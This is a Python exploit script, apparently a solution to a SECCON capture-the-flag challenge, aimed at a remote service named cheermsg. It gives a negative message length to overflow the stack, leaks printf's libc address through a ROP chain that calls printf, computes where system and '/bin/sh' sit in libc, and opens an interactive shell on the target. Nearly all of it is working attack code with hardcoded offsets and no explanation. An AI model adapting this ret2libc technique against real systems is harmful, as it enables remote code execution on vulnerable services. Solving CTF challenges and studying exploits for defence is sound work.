import os, socket, struct, telnetlib

# --- common funcs ---
def sock(remoteip, remoteport):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]

# --- main ---
s, f = sock("cheermsg.pwn.seccon.jp", 30527)

printf_plt = 0x08048430
printf_got = 0x804a010
libc_system_offset = 0x00040310
printf_offset = 0x0004d410
binsh_offset = 0x16084c

read_until(f,"Message Length >>")
f.write("-144\n")                
read_until(f,"Name >>")

buf = p(printf_plt)
buf += p(0x080485ca) # Return to main()
buf += p(printf_got)
f.write(buf + "\n")                

read_until(f,"Message : \n")

printf = u(f.read(4))
libc_base = printf - printf_offset
libc_system = libc_base + libc_system_offset
binsh = libc_base + binsh_offset

read_until(f,"Message Length >>")
f.write("-144\n")                
read_until(f,"Name >>")

buf = p(libc_system)
buf += p(0xdeadbeef)
buf += p(binsh)

f.write(buf + "\n")                

shell(s)
